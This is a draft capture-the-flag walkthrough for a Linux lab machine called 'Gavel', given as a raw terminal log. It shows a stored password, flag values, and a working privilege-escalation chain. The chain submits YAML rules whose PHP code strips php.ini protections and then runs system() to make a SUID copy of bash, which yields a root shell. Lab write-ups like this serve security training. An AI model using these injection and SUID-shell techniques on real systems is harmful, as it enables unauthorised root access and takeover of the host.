---
draft: true
title: Gavel
date: 2025-11-13
weight: -811
tags:
  - linux
  - medium
  - sqli
  - rce
---




```
www-data@gavel:/var/www/html/gavel/rules$ su auctioneer 
su auctioneer 
Password: midnight1

auctioneer@gavel:/var/www/html/gavel/rules$ cd /home
cd /home
auctioneer@gavel:/home$ ls
ls
auctioneer
auctioneer@gavel:/home$ cd auctioneer
cd auctioneer
auctioneer@gavel:~$ ls
ls
user.txt
auctioneer@gavel:~$ cat user.txt
cat user.txt
6a37f3c29a70add5f3ce0e27267281eb
auctioneer@gavel:~$ ls -alh
ls -alh
total 12K
drwxr-x--- 2 auctioneer auctioneer 4.0K Nov  5 12:46 .
drwxr-xr-x 3 root       root       4.0K Nov  5 12:46 ..
lrwxrwxrwx 1 root       root          9 Nov  5 12:20 .bash_history -> /dev/null
-rw-r----- 1 root       auctioneer   33 Dec  1 03:19 user.txt
auctioneer@gavel:~$ cat .bash_history
cat .bash_history
auctioneer@gavel:~$ cat << 'EOF' > fix_ini.yaml
cat << 'EOF' > fix_ini.yaml
> name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
EOFname: fixini
> description: fix php ini
> image: "x.png"
> price: 1
> rule_msg: "fixini"
<pen_basedir=\ndisable_functions=\n"); return false;
> 
EOF
auctioneer@gavel:~$ ls

ls
fix_ini.yaml  user.txt
auctioneer@gavel:~$ 
auctioneer@gavel:~$ 

auctioneer@gavel:~$ cat fix_ini.yaml
cat fix_ini.yaml
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
<bin/gavel-util submit /home/auctioneer/fix_ini.yaml
Item submitted for review in next auction
auctioneer@gavel:~$ cat /opt/gavel/.config/php/php.ini
cat /opt/gavel/.config/php/php.ini
engine=On
display_errors=On
open_basedir=
disable_functions=
auctioneer@gavel:~$ cat << 'EOF' > rootshell.yaml
cat << 'EOF' > rootshell.yaml
> name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOFname: rootshell
> description: make suid bash
> image: "x.png"
> price: 1
> rule_msg: "rootshell"
<ash; chmod u+s /opt/gavel/rootbash'); return false;
> 
EOF
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
<n/gavel-util submit /home/auctioneer/rootshell.yaml
Item submitted for review in next auction
auctioneer@gavel:~$ ls -l /opt/gavel/rootbash
ls -l /opt/gavel/rootbash
-rwsr-xr-x 1 root root 1396520 Dec  1 05:57 /opt/gavel/rootbash
auctioneer@gavel:~$ /opt/gavel/rootbash -p
/opt/gavel/rootbash -p
rootbash-5.1# id
id
uid=1001(auctioneer) gid=1002(auctioneer) euid=0(root) groups=1002(auctioneer),1001(gavel-seller)
rootbash-5.1# cd /root
cd /root
rootbash-5.1# ls
ls
root.txt  scripts
rootbash-5.1# cat root.txt
cat root.txt
760dcaee8fdb32538dd9ca6fe3c47f7e
rootbash-5.1# 

```